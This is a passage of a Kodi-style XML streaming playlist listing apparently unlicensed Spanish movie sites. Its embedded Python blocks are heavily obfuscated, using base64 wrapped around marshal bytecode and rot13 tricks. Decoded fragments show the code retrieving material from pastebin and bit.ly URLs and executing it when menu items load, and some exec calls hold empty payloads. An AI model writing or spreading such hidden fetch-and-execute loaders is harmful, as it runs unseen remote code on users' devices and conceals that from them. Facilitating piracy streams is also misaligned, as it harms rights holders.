VlJaTlU1VVNUSlplbFUxVG0xWk1rMVVVVEZPUjBreFRWUk5ORTVFVlRKUFJGcG9UWHBaTWs1NlRUSk5lbXN3V21wU2FVNUVUVE5OUkZrelRtMU5NazlVV210T2FtTXpUVlJWZWs1VVRUQlBWRkY1VGxSRk1scFVXVEpPYlZVeVRrUlZOVTVVWnpCT1JGa3pUWHBSTWs5RVRYaE5la2t4VFhwTk0wNUhVVEJOYWxFMVRtcFJNRTFVV214T2VrVXdUbFJWTVU1NlkzcE9WRkY0VGtSTk1scHFVWGhPUkZVelRrUlZOVTU2UVRKT2FsVXdUbXBaTWs1cVZYbE9hbWN6VGxSWk0wNUVWVEpaYWxFeFRrZFplazFFWTNsT2VrMTZUVVJOTTA1NlJUQmFSRkpzVG0xWmVrMVVUVFZPUkVrd1RsUmpNMDE2V1hwT2VsRTFUa2RWZVZwcVdtdE5la0V3V1ZSak1rNVVUVEJhYWxrMVRsUlZNbHBxVlRSTmVsRXdUbnBaTVU1RWF6QmFSRXBwVGtSck1FOVVVbWhPVkZFelQxUlJNazE2UVRCT1ZGVTBUbXBqTWxwcVdUTk9SRlV6VGxSVk0wNVVXVEJhYWxFMVRYcHJNVmxVVlRGT1JGVXdUVlJLYVU1dFJUSmFSRkpvVGtkVmVrOVVXVEJPVkVVeFRXcE5OVTVxUlRCT2VsVTBUa1JyTUUxVVVUTk9WRmt3VDFSU2FFNXRSVEpOZWxVeVRtcG5NRmxxV20xT1IwVXhUWHBaTkU1RVl6Qk9WRnB0VG5wUk1FNVVXVEZPYlZVd1RWUlJNRTVVV1RCTlZGSnJUa1JWTTA1NldtMU9lbFV6VFhwTk0wNXRSVEZQVkZKcFRsUkZNRTFxV1hwT2JWRXlXVlJqZWs1VWF6Tk5hazB3VG5wak1FNTZUVFZPVkdzd1RsUlZlRTU2WnpCTlZGRjRUa1JyTUU5VVl6Tk9SR3Q2VDFSU2FFNTZXVEZOYW1Nd1RrUkpNazVxV21oT1ZHY3pUV3BqTlU1VWEzcE5SRnB0VFcxSk1scHFVbWhPVkZVd1RXcFJOVTU2WnpKYVZHTTBUa1JyZWsxRVdUTk9SR041V1dwak0wNXRTVEphUkZrMVRtMVpNRTlVV1ROT2FsRXhUMVJOTTAxNlRYcE5lbFpvVGtSWk1rNTZVbXBPVkZWNlQwUmpOVTVxYXpOT2FtTjZUbXBSTWxscVkzaE9la0Y2VGtSVmVVNUVSVEZOVkdOM1RtMVpNVTE2U20xTmVrRXpUVVJOZWs1dFJURk5WRlY2VGtSbk1rNUVZM2RPYWxFeFRWUlJlVTV0U1ROT1JGRjRUbTFSTTA1VVRYZE9hazB6VFdwUmVFNUVUVEJPZW1OM1RrZEZNazU2WTNkT1Iwa3hUVlJWZWsxNlZUQk5WRkV4VFhwbk1rMTZZM2xPZWxrelRtcGFhVTE2U1ROT2VsSnRUa2RSTUU1NldURk9SMWt4VGxSUk1rNVVVWHBQUkZrMFRucE5lazlVVVhwT1ZFMHdXWHBWTlUxNlNUSk9SRTE0VG1wVk1rOVVZM2hOZW1zeVRWUlpOVTVYUlRGTmFtTXdUbXBuTWxsNlkzaE9WRkV3V1ZSVmQwNUVhek5PUkdNMVRsUlpNVTU2V1hwT1JFa3lUa1JhYVU1SFZURk5lbEV4VGxSQk0wNTZXVFJPUkZreVRWUlJlRTF0U1hwTlJHTjNUbFJWTTA1NldUVk5lbWN3VGxSTmVrNTZhekJaZW1NelRrUlJNVTU2V20xT1JGbDZUV3BWZVU1SFZUQk5WRkV5VFhwQk1FMXFVWGxPZW1jd1RtcE5lRTVVWjNwUFJGWm9UbFJGTUZscVZYcE9la0V5V21wU2FVMTZXVEpQVkZFeVRXMVpNMDVVVlhsTmVra3lUbXBOTTA1NldUSlplbEY1VFcxWk1scHFXVFJPUkdzd1RXcE5NRTVIUlRCT1ZGRjVUa2RWZWsxNlRUSk9SMWw2VFhwVk1FNUVZekJhYWxwdFRsUm5NMDlVVFRGT1JFVXhUa1JaTUU1dFRUQk9lazEzVGxkRk1FOVVVVEpPTWtWNVdXcFJlVTU2VlhwTlJGSm9Ua2RSTWs5VVVtcE9lbGt3VFZSUmVVNUVWWHBPVkdNMVRsUnJNVTU2U21sTmVtY3dXWHBaTUU1VVZUSk5WRTB3VGtSTk0wNUVWVEpPYW1NeFRXcE5NVTVVWjNwTlZFMTNUbTFaTWsxcVNtbE9SR2N3VDBSUmVFNXRWVEJPZWxwb1RXMUpNazlVVVRCTmVsRXlUVlJSZWs1NlVURlpWR013VGtSck1scHFXbTFPZW1zd1RWUmFhVTV0V1RGTmVsa3dUa1JGTUZwRVNtMU9lbFV3V2tSUk1VNXRTVEZOZWxrMFRXMVpNRTE2U20xT1JHc3hUa1JOTkU1cVp6Tk5hazE1VGxkRk1FNXFWWGhPYWxreVdYcGplRTV0V1RKWlZGazFUbXBaTWxsVVZYbE9WRTB6VFZSVmQwNTZhM3BPVkZVeFRrUkZNVTFVWTNoTmVrRXdUa1JOTkU1cVVUQk9hbU4zVG5wbmVrNTZZM2RPUkUweFRtcEtiVTVFVlRKTmVsVjRUa1JuTWs1VVdYcE5la2t6VDBSV2FFNUVWVE5OYWxKcFRrUk5NazlFV20xT2FsRXhUMVJSZWs1SFdUTk9SRkV3VGtkSmVWbHFUWGhPVkdONlRWUlJORTU2VlRGT1JHTTBUbFJuTUZscVl6Uk9Na1V5VGtSUmVFMTZSWHBOVkZKc1RtcFJNVTlFVVhwT2Vsa3hUVVJOTWs1Nlp6RlBWRkY1VG0xSk1FNXFVbTFOYlVrd1dsUmpNMDVxYTNwT2FsRTFUbnBOTVU5VVdUQk9SMFV3VFhwUk1FNVVXVEZQVkUwelRucEZNMDVVVVRGT1ZFbDZUMVJSTlUxNmEzcFBSRkY0VGxSQk1rMXFVbXRPYlVreVdtcGFhazVVWXpCWlZFMDFUa2RWTVUxcVZUSk9SR2N5V1dwUk5VNXFXVE5PUkZsNVRucEZNVTE2VlRSTmVtTXdUbnBWTTA1SFNUQlpla3B0VGxkRk1FNXFVVEJOYlVrelRYcFJORTVFYXpCTmVsVjNUbnByTUUxNll6Rk9lazB3V2tSak1rNTZhM2xaYWxsNlRtcHJNbGw2V20xT2Vra3lUVlJSZWsxNldURk5hbU14VG5wTk1GcEVUVEpPVkZFelRsUmFiRTU2VlRKWmFsRjVUbnBSTVZsVVdYcE9WRmt5VFdwVmQwMTZXVEJOYWswd1RrZEZlazU2VlhwT2Vtc3lXV3BWTkUxdFdUQlBWRlV3VG5wWk1rOVVWVE5PTWtVeVRucGplVTV0U1RKYWFsVXlUWHBOTVUxNldURk9iVmt4VDFSTk5FNVVSVE5PZWswMFRtcGplVmxxVlhoT1ZHY3lXWHBWZDAxdFNUSlBWRmswVGxSbmVrMUVXWGxOZW1jeFdWUlZORTU2U1RCT2VsSnRUbnBaZWs1RVdUVk5la1V6VGtSVk1VMTZSVEZPZWsxNFRYcEpNMDFxU20xT1JGVXhUa1JqZVUxdFNUQlphazB6VG1wVk1scEVVVEZPTWtVeFRYcFplazU2U1hwT1JHTjZUbTFOZWs5RVdUQk5lbEV3V21wVmVVNTZUVEZPZWsweVRsUk5lazU2V1hoT2FrVXhXVlJWZDA0eVJUTlpWRnBvVFhwQmVWbHFUVFJPYWxFeFQwUlNiVTE2VFRCWlZFMHhUWHBOTTA1NldYaE5lbU16VFhwamVFMTZhekZOZW1OM1RYcFZNbGw2WXpCT01rVXlUV3BSTlU1VVp6SmFSRTB3VGxSbk1VOUVZekZPUkVreFRtcFJNVTVIVVROTmVsRXdUbTFGTUU5RVVtMU9SMVV6VDBSTk1rNXRTWHBOYWsweVRtcFplazU2WTNsT1ZFa3lXV3BaZWs1VWEzcE5hazB4VFhwRk0wMUVZekZPYW1kNlQwUlZNRTV0UlRCYVZFMDFUa1JqTTAxVVVUVk9iVTB6VG1wYWJFNTZTVE5aVkZGNVRsUk5lVmxxVW10T1Iwa3pUVVJTYWs1RWF6Tk9hbHBzVGtkTk1VNVVZekJOYlZreFdWUkthVTF0V1ROTlJGa3pUbXBKTTA1RVVteE9la2t6VFhwWk1rNVVVVEJPVkZrd1RsUlpNazVVVW10T1ZFbDZUWHBhYWsxNmEzcFBWRkY1VG1wVmVrMVVZekJPVkZsNlRtcE5NVTVxVlRKWlZGcHFUWHBOTTAxcVRUUk9SRmw2VFdwWk1VNVVaek5aVkZrelRsUk5lazFxVVRGT2JVbDZUWHBOTWsxdFdYcE9hbGw1VGtkTmVrMVVZM2xPYlZsNlRWUmFiVTE2WnpOWlZGWm9Ua2ROTUZsVVVtbE9la0V5VFdwUmVrNVVaekZQUkdSb1RXMVplazlFVm1oT2JWa3pUbXBTYUU0eVJUTlBWR014VG5wTk1scHowd29BQUVkYU1VRkhSREpNYlUxM1FYcFNNRTFIUlhkYWJWSnRXbTFNTlVGUlZqRmFSMWQ2UVRKU01VRjNTRFZCUjNBelFVZElORUZVVEcxQmQwUTBRWGRJTWt4dFNHcEJiVWd4UWxGYU1rRjNjRE5CZDB3MFducFdNa0YzU0RWQlIzQXlRVkZ3TWxwdFVqRkJSMFF6UVVkd01FRnRjR3hCZWtnelFWRk1NVUYzVmpCTWJVVjNRVWQ0TUZwM1RETmFiWEF5VFZGSWJWcHRWakJCVVVRMFFVZHdNMHhIUlhoQlVVeHRRa2R3TWtGSFZtMUJiVm93UVZSV01FSlJSREpCYlhReldrZHdNa0ZSUkRKQmQweHJRVWRPYlVGdFRYVkJiVVJ0UWxGYU1VRjZTRE5CUjFwdFFYZE1iVnBIY0cxWGFqQlliakpKTlc5S1UyVk5TMVowUTBaT1lVZHRjRFJHUzNodFdrcFdiVWxIVEcxSWVrdzFTbnBuV2toTFYyMXhVbU5UU25wYWJXOUtTVFp1WVdJMFdraG5aRUpSVjB4YVlVOVVUVWxYUzFsdGRXRnhVMU5EUVhkUGFYQXdjVEp1TW1OVFRUTjVOazFHWm1wRU1HTkVRa2hYUlVWSGVHdHZSM2xRVEdGRlJrVXdRWGRDUzA5UGNsUnhaMHg2Y0d4SFlVeGxjSGxCWTBFelJVdE1iVmRRUVV0aU1HNTNUakJKTWtWSmIwbEZSVVF6Y1d4d1NHZE5SREI1VUZveFkwVktlRk40YmpKeE5Ga3dOVXBZTVU1cVJqTkpNMEZLVTBGeVNGZHNXRzFYU1hCVFJVMXdVblJsU2xSSk1rWmhZMGxCU21kaVJHRkpTWEF5U1ZSeGJYRTBia2RGZWtSaFNESkZTamt4UlVsNWJVUkpUVTFKZW5GYVNrbDRNVVYzZERWQ1ZFbGhibEZTYWxneWRWZEJTakY0UmtkTU5FcDRZelZhVlVGdVRYcHJTM0oyWjBsdVZIZ3dRbEJuWVVoS1NXWlpNbXRaY0VkMU5FWnRlV05DU1hrMWNVbzRNVzlLZVVkWWJWZFNSRXA1VjBKVFJYcEZla2t5UkhwNVVHOHpUVXhITTNBMVJFZFhOVUZLVW1WTllVbDFRbFYxZDB4SlUweFpNakZuV0ROSlNtOUtNWGRCVWxjMWNIWm5abkF4Ukd4YWVtWnJSMHBKWVVwU01UTkJkMU5wY1d3NWVtNVZZMlZ3U0VobFNraFRiRnBIV20xdVNYRnVTRVk0Ylc1VlFWQnZWVTlXYnpOd01VcElOVmh2ZUdObVFrZDVTbGt5ZFZCdmJYRmhSREY1YlVWTFYxUndTRmRoY2twbU1FVXlSV1JaTUd0cWNIcEpObkJMVG1WRk1HdE5TVXRYZDBwTFRqQk5lbmxWUjFReFZWcDRPVkpOU0VVd1drZFRlbTVUZFZKS1NtTmtibFZQVjBjemNVVnZkMWN4Y0ZWeGFtNHlZekJJTVZkdGJrbzVVVVpoY1RGdlVVRkRRVlExUzBWS1owOU5ZVkpzU2twcVpVbEtabXhHZDFvelJuZEpaVWxLU1ZKYWQwRm1Ra2cwYkVGVVkweE1TR05oUlRGalZIQmhlV1pOZUZOWmIzZHhZa1F4Ulhad1lWcHJXbmxYZG5KSGVVWnVTWFF4Y1ZWMGJGb3pUMWxGZWpGWVRFdFdaWEJUZVVOWk1GTkdSMUJtTlc5dFYyWk5lVkpzV2t0RloyOVZUekJDVlZjeldtRndhVnBUVjNWeFMwUnJiekpuUmtZeFZqTkZNa1EwY2xKalMwWXhVME5IZW5SbGNYaG5NVVl5TkdWeGVYZzFTSGQ1U1c0eGRXbENTMU4xVFZGRmFWcFNPVEZ4ZW1OTFdrcDFka2hLZFVWd2VubHNTVEE0TkVSSGNWaEVTRm96V25sSU5Ga3daMlJhZVhWTFFXMVRUVXhIZERGSlMxTk1RVE5XTW00eWVXdEJiRGd5Y1ZGSWJYRktlVTFLU21ORldqSm5VRUpIZERKSlVuRTBja3RCVVZsdFFXaHdiR2RGUm5kVGRrMWhWak5CZVVWb2IyMTVXRVYzVjFsQmVYVlBjVWxYU0c0d2VWbEhSMUl6U1cxWFNVVlNaMXBITVVReldqSkphRWQ2UldweGQzRmhSSGRYTUhBd1dtbGFWRVJwU1VsNGJVRnRTV3hCZWxNMFNVaEVhbGd4VFd4RVNWTnJXbEZCTlVWUlRWUkJNMHcwU2t0WE1FSlFPV2R1VURnMGJsSlRURzVzT1daQ1VVeHBURzFCZFVGVWNHcHVVa1JsY1RKNVVVUklTREZ1TUhCcFRYcDVZMDF0ZUdsS1UwRXpUSFk1WkVWMk9UUklNbmx0UkdGeFZsb3pXak5OVWtnMFJtdzVTVTFWVGpOdVNqbE5SVWhqTlVadGVXdEdSMEZQY1VkVFdtNVVVMkZ3U0ZvelJWVlBUMFpIUVdwTWVVRjRTVVpuZGtkSVYweE5NR3Q1VFcxYWFWcHRUV3RaTWtSdFJubDBNM0IzV2pGR1NGWTFRa3ROU0V3elUwdHhSbWROU0ZWSlNreEtSV1ZZTVZKcFFYZFBhMjh3WWpWQlNtbzBjRWhKYTBoSmVEUkJTRGxRYjNveFZWa3dRVFJ3VTNsS1FsRjBOSEJJWW0xSE0zbGhiMGgwTlZwTFZtcEZSM1ZKUjFKWGRuRXhZMDFCUjFkUldqQlhTRUpJTURWeE0wOXVRbE5UUVVWSGVHbHZNMEZOV2twQlNVSkxWbXRHZUdkclRESkZZMEpUVFhkTk0wRlhja2hqWlVGVlUxRnZNVmRIUjFGRmVscHNPRE5JU0daclIwcFRNa0ZLVWpKTllXSnBRa1k0Tkc5VlFXSkNWVUYxYmtsWGFsa3pVakp2TUZkMVFWVmpNMDEyT0ROSVVVNHpXakpJTVc1S1JVdEJTRFEwUVRCU01VbDRSVkZNZW5sRlJtMTRhVzUzZEdsSVVWcHBSVlF4YlZodGRVOUJNMWRqUkRCbWJVRnRTVEJDU21vMGNsUXdaVXAzY1RaRmJVOTVUV0Z3YkhCc09HMWFlREZsVFV0d2JGcEhUMFZNTTA1cWNUTkJZMjVIY1ZaYWJVRkZXbEYxTVVreFUxRkJNMWRqU1cxT2FWcHRWelpLZW1ZeldERjFiVTB3UVdaRlVtWTBSVE4xVTBSdGNHbHVNMEZoU1VwSlFXNUlTVE5ZYkdkUVJsSndhVnBVTVcxeE1rbGhXbXc1ZDI1U1ozVkZiVTk0U0VZNVIwbDNRWGRhZWtocFdsQTRhMWxzWm1sWWJVbHRSVXR4WVVKS2VWSlpiRGt6UWtkNE1rcExVbWxhVUdkSlFVZE1ORUpRT0dsWk1raHJXakl3YVV4Mk9ERk5lRlpwV1RCYWExcEhUR2xCTTBGM1dUTndiRnB0ZFVKTmVEVnRUVWRYUWtOSE1HRlJSR00yYmtvNWFGWlJNSFJYTVdzMFFXMVhjSEpSVFhwTFZYUXpRVk5yTkZwdFUzQnlVVnB0VjJvd1dHOTZTV2xXVVRCMFRVdE5kVzlRZEdGTFZYUXlXbmxyTkVGM2VYQnlVVTE1UzFWME1scEphelJCYlVGd2NsRk1iVXRWZERKQ1NXczBRWGQ1Y0hKUlYzbExWWFF6UVVsck5FRjZTWEJ5VVV3MFMxVjBNa0ZKYXpSQmJYVndjbEZOZDB0VmRESkNTV3MwUVhkTmNISlJjRFZMVlhSc1FsTnJORUY2UlhCeVVVMTZTMVYwTTFwNWF6UkJiVTl3Y2xGTU5FdFZkREpCU1dzMFFXMUpjSEpSY0cxTFZYUnNRa2xyTkZwM1RtRllSazVsVmxSSk1reEthbUpYTVdzMFFYZEJjSEpSVFhwTFZYUXlRVk5yTkVGM1NYQnlVVXh0UzFWME0xb3hhelJhZWtsd2NsRk1NRXRWZERKQlNXczBRWGRCY0hKUlRYcExWWFF5UVZOck5FRjNTWEJ5VVZZMFMxVjBNMEZUYXpSQmJWZHdjbEZNTlV0VmRESk5TV3MwUVhkNWNISlJjREJMVlhRelFrbHJORnA2UVhCeVVWWnFTMVYwTTB4SmF6UkJkM2x3Y2xGTmVrdFZkREpOU1dzMFduZDRZVmhHVG1WV1ZFa3lURXBxWWxjeGF6UkJkMWR3Y2xGTU5VdFZkREpOU1dzMFFYZFRjSEpSY0cxTFZYUXlXakZyTkVGM2VYQnlVVXcxUzFWMGJFMUphelJCYlVsd2NsRk5lVXRWZERKQ1UyczBRWGRKY0hKUmNEUkxWWFF5VERGck5FRjNlWEJ5VVV3eVMxVjBNMEpKYXpSYWQzVndjbEZOZWt0VmRETmFlV3MwUVhkVGNISlJURzFMVlhReVRERnJORUYzU1hCeVVWWTFWMng0ZEZoc1QzbHhlbE5tV0ZCeGNISlJURzFMVlhReVRYbHJORUYzUlhCeVVVd3hTMVYwTWxveGF6UkJiVUZ3Y2xGWGVVdFZkREpCVTJzMFFYZEpjSEpSVEcxTFZYUXlUWGxyTkVGM1JYQnlVVXd4UzFWMGJFSlRhelJCZWxkd2NsRk1NVXRWZEROQ1NXczBRWHBGY0hKUlRHdExWWFF5VEhsck5FRjNTWEJ5VVhCc1MxVjBiRnBUYXpSYWVrRndjbEZXYWt0VmRETk1TV3MwUVhkNWNISlJUWHBMVlhReVRVbHJORnAzZUdGWVJEQllUVXROZFc5UWRYZHZNakZxYmtwcmVWaFZZMlp1U2xab1RWUkpkMjh5TVdwd2VrbHRjR3gxZGt4TFFYbEJkMFJvVEhkTU1FMVVTWGR2TWtWNVdGUkpNa3hLYW1KWE1XczBRWHBKY0hKUlRERkxWWFF5VFhad1kxaEdlR1pYYld0dGNWVlhZMjk2Y0N0WGJHcGhUVXQxZVV4c2NHTllSRDA5ZEFVQUFBQnliM1F4TTNNSkFBQUFiVzl5Y0dobGRYTWdjeHdBQUFCamIyUmxZM011WkdWamIyUmxLSFJ5YVc1cGRIa3NJSHBwYjI0cGRBWUFBQUJ2Y21GamJHVnpIZ0FBQUdOdlpHVmpjeTVrWldOdlpHVW9hMlY1YldGclpYSWdMQ0I2YVc5dUtYUURBQUFBYm1WdmN3Z0FBQUE4YzNSeWFXNW5QblFFQUFBQVpYaGxZeWdMQUFBQWRBWUFBQUJpWVhObE5qUjBCZ0FBQUdOdlpHVmpjM1FJQUFBQWJXOXljR2hsZFhOMEJ3QUFBSFJ5YVc1cGRIbFNCQUFBQUhRSUFBQUFhMlY1YldGclpYSjBCQUFBQUhwcGIyNTBCQUFBQUdWMllXeFNCUUFBQUhRSEFBQUFZMjl0Y0dsc1pYUUpBQUFBWWpZMFpHVmpiMlJsS0FBQUFBQW9BQUFBQUNnQUFBQUFjd1lBQUFCelkzSnBjSFIwQ0FBQUFEeHRiMlIxYkdVK0FRQUFBSE1PQUFBQUdBRUdBUVlCQmdFR0FRWUJLZ0U9IikpKQ=="))
]]></expres>
<page></page>
<agent></agent>
</regex>
<regex>
<name>busca</name>
<listrepeat><![CDATA[
<title>[COLOR white][busca.param3]  [COLOR gold][busca.param4][/COLOR]</title>
<link>$doregex[peli]</link>
<thumbnail>[busca.param2]<thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
elegir = '[A.param2]'
import re,requests,base64,xbmc,xbmcgui,xbmcaddon
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>peli</name>
<listrepeat><![CDATA[
<title>[COLOR white][peli.param2]  [COLOR gold][peli.param5][COLOR orange]  [peli.param3][/COLOR]</title>
 <link>$doregex[selecion_inteligente]</link>
<info>[peli.param6]</info>
<thumbnail>[busca.param2]<thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url='[busca.param1]'
import re,requests,base64,xbmc,xbmcaddon
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>link_final</name>
<expres><![CDATA[#$pyFunction
servidores='[peli.param4]'
referer='[busca.param1]'
import re,requests
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>selecion_inteligente</name>
<expres><![CDATA[#$pyFunction
url = '$doregex[link_final]'
$doregex[importar]
from resolveurl.plugins.lib import jsunpack
$doregex[reparar_conectores]

]]></expres>
<page></page>
</regex>
<regex>
<name>reparar_conectores</name>
<expres><![CDATA[#$pyFunction
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUFRQUFBRUFBQUFCekRRQUFBR1FBQUlRQUFGb0FBR1FCQUZNb0FnQUFBR01EQUFBQUJRQUFBQU1BQUFCREFBQUFjMEVBQUFCa0FRQmtBQUJzQUFCOUF3QmtBZ0JxQVFCa0F3Q0RBUUI5QkFCa0JBQnFBUUJrQXdDREFRQjlBQUI4QXdCcUFnQjhCQUI4QUFBWGd3RUFhZ01BZ3dBQVV5Z0ZBQUFBVG1uLy8vLy9jeFFBQUFCaFNGSXdZMGhOTmt4NU9XbGhXRkYxWWtoclBYUUdBQUFBWW1GelpUWTBjeUFBQUFCTU1FNTJZbTFXYW1SSE9YbGFXRTVtVVROS2NHTXpVbWhpUlVZMlpGZDNQU2dFQUFBQWRBY0FBQUIxY214c2FXSXlkQVlBQUFCa1pXTnZaR1YwQndBQUFIVnliRzl3Wlc1MEJBQUFBSEpsWVdRb0JRQUFBSFFSQUFBQVR6QlBNRTlQTUU4d01FOVBNREF3VHpCMEVRQUFBRTlQVDA4d1QwOVBNRTh3VHpCUE1FOHdkQkVBQUFCUFR6QXdNREF3TUU4d1QwOHdUekJQVDFJQkFBQUFkQkVBQUFCUE1FOVBUekF3TUU5UE1EQXdUMDlQTUNnQUFBQUFLQUFBQUFCekJnQUFBSE5qY21sd2RIUU1BQUFBUjJWMFRGTlFjbTlFWVhSaEFRQUFBSE1JQUFBQUFBRU1BUThCRHdGT0tBRUFBQUJTQ1FBQUFDZ0FBQUFBS0FBQUFBQW9BQUFBQUhNR0FBQUFjMk55YVhCMGRBZ0FBQUE4Ylc5a2RXeGxQZ0VBQUFCekFBQUFBQT09IikpKQ=="))
]]></expres>
<page></page>
</regex>
<regex>
<name>importar</name>
<expres><![CDATA[#$pyFunction
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUFRQUFBRUFBQUFCekRRQUFBR1FBQUlRQUFGb0FBR1FCQUZNb0FnQUFBR01EQUFBQUNBQUFBQVlBQUFCREFBQUFjL1FBQUFCa0FRQmtBQUJzQUFCOUF3QmtBUUJrQUFCc0FRQjlCQUJrQVFCa0FBQnNBZ0I5QlFCa0FRQmtBQUJzQXdCOUJnQmtBUUJrQUFCc0JBQjlCd0JrQWdCOEJ3QnFCUUNEQUFCcUJnQmtBd0NEQVFCckJnQnlnUUI4QkFCcUJ3QmtCQUJrQlFCcEFnQmtCZ0JrQndBMlpBZ0FaQWtBTm1RS0FIUUlBSU1CQW1vSkFGTmtDd0I4QndCcUJRQ0RBQUJxQmdCa0F3Q0RBUUJyQmdCeXhnQjhCQUJxQndCa0JBQmtCUUJwQWdCa0JnQmtCd0EyWkFnQVpBa0FObVFLQUhRSUFJTUJBbW9KQUZOOEJBQnFCd0JrREFCa0JRQnBBZ0JrQmdCa0J3QTJaQWdBWkFrQU5tUUtBSFFJQUlNQkFtb0pBRk5rQUFCVEtBMEFBQUJPYWYvLy8vOTBDd0FBQUdOeWFYTjBZV3hoZW5Wc2RBSUFBQUJwWkhNaEFBQUFhSFIwY0hNNkx5OXdZWE4wWldKcGJpNWpiMjB2Y21GM0wycFFXbUZDUjFsT2RBY0FBQUJvWldGa1pYSnpjMGdBQUFCTmIzcHBiR3hoTHpVdU1DQW9WMmx1Wkc5M2N5Qk9WQ0EyTGpNN0lGZFBWelkwT3lCeWRqbzFOUzR3S1NCSFpXTnJieTh5TURFd01ERXdNU0JHYVhKbFptOTRMelUxTGpCekNnQUFBRlZ6WlhJdFFXZGxiblJ6RkFBQUFHaDBkSEJ6T2k4dmNHRnpkR1ZpYVc0dVkyOXRkQWNBQUFCU1pXWmxjbVZ5ZEFZQUFBQjJaWEpwWm5sMEJRQUFBR1psYzNSaGN5RUFBQUJvZEhSd2N6b3ZMM0JoYzNSbFltbHVMbU52YlM5eVlYY3ZSalJvZG1KcGVIa29DZ0FBQUhRQ0FBQUFjbVYwQ0FBQUFISmxjWFZsYzNSemRBSUFBQUJ2YzNRRUFBQUFlR0p0WTNRSkFBQUFlR0p0WTJGa1pHOXVkQVVBQUFCQlpHUnZiblFNQUFBQVoyVjBRV1JrYjI1SmJtWnZkQU1BQUFCblpYUjBCUUFBQUVaaGJITmxkQVFBQUFCMFpYaDBLQWdBQUFCMEVRQUFBRTh3VHpCUE1EQXdUekF3TURCUE1FOHdkQkVBQUFCUE1FOVBUekF3VHpBd1R6QXdUekJQVDNRUkFBQUFUMDlQVHpCUE1EQlBUMDlQTUU4d1R6QlNCZ0FBQUZJSEFBQUFVZ2dBQUFCU0NRQUFBRklLQUFBQUtBQUFBQUFvQUFBQUFITUdBQUFBYzJOeWFYQjBkQXdBQUFCSFpYUk1VMUJ5YjBSaGRHRUJBQUFBY3d3QUFBQUFBVHdCR3dFcUFSc0JLZ0pPS0FFQUFBQlNFd0FBQUNnQUFBQUFLQUFBQUFBb0FBQUFBSE1HQUFBQWMyTnlhWEIwZEFnQUFBQThiVzlrZFd4bFBnRUFBQUJ6QUFBQUFBPT0iKSkp"))
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/m6YPUYA.jpg</thumbnail>
<fanart>https://i.imgur.com/YJvk7cD.jpg</fanart>
</item>







<!--
<item>
<title>[COLOR gold]*[/COLOR] [COLOR lightsalmon]Cliver [COLOR white]web[/COLOR]</title>
<link>http://ignorame</link>
<thumbnail>https://i.imgur.com/m6YPUYA.jpg</thumbnail>
<fanart>https://i.imgur.com/YJvk7cD.jpg</fanart>
<externallink>https://pastebin.com/raw/UJEYjXgx</externallink>
</item>
-->



<item>
<title>[COLOR gold]*[/COLOR] [COLOR lightsalmon]Mega1link [COLOR white]web[/COLOR]</title>
<link>http://ignorame</link>
<thumbnail>https://i.imgur.com/magCc8J.jpg</thumbnail>
<fanart>https://i.imgur.com/YJvk7cD.jpg</fanart>
<externallink>https://pastebin.com/raw/SxUeqZqY$$LSProEncKey= $$</externallink>
</item>



<item>
<title>[COLOR gold]*[/COLOR] [COLOR lightsalmon]Pelispedia [COLOR white]web[/COLOR]</title>
<link>http://ignorame</link>
<thumbnail>https://i.imgur.com/Trqj1Ba.jpg</thumbnail>
<fanart>https://i.imgur.com/YJvk7cD.jpg</fanart>
<externallink>https://pastebin.com/raw/9BKsQsMf$$LSProEncKey= $$</externallink>
</item>




<item>
<title>[COLOR gold]*[/COLOR] [COLOR lightsalmon]Cine Calidad [COLOR white]web[/COLOR]</title>
<link>$doregex[A]</link>
<regex>
<name>A</name>
<listrepeat><![CDATA[
<title>[COLOR gold]*[COLOR lightsalmon]Cine Calidad [COLOR white][A.param1] [/COLOR]</title>
<thumbnail>https://i.imgur.com/PfGj27S.jpg</thumbnail>
<fanart>https://i.imgur.com/YJvk7cD.jpg</fanart>
<link>$doregex[makelist2]</link>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
<agent></agent>
</regex>
<regex>
<name>makelist2</name>
<listrepeat><![CDATA[
<title>[COLOR white][makelist2.param3][/COLOR]</title>
<info>[COLOR gold][makelist2.param4][/COLOR]</info>
<link>$doregex[makelist]</link>
<thumbnail>[makelist2.param2]<thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
elegir = '[A.param2]'
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,shutil
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>makelist</name>
<listrepeat><![CDATA[
<title>$pyFunction:('[COLOR white][makelist.param3][makelist.param5][/COLOR]').replace('Trailer','[COLOR red]Trailer[/COLOR]')</title>
<link>$doregex[selecion_inteligente]</link>
<thumbnail>[makelist2.param2]</thumbnail>
<fanart>[makelist2.param2]</fanart>
<info>[COLOR gold][makelist2.param4][/COLOR]</info>
]]></listrepeat>
<expres><![CDATA[onlinelink".{0,30}(Jetlo|Vidclo|Goun|Mega|Tra).*? data="(.*?)".{0,20}<li>(.*?)<|<a href="(/protect.*?)".*?service=...(.*?)>]]></expres>
<page>[makelist2.param1]</page>
</regex>
<regex>
<name>final-feliz</name>
<expres><![CDATA[#$pyFunction
url = '[makelist.param2][makelist.param4]'
import requests,re
def GetLSProData(page_data,Cookie_Jar,m):

 if not 'protect' in url:
  s = '[makelist.param2]'
  def enc(s):
    d=''
    s=s.split(' ')
    for strchar in s:
        d += chr(int(strchar)-2)
    return d
  esto = enc(s)
  return esto
 else:
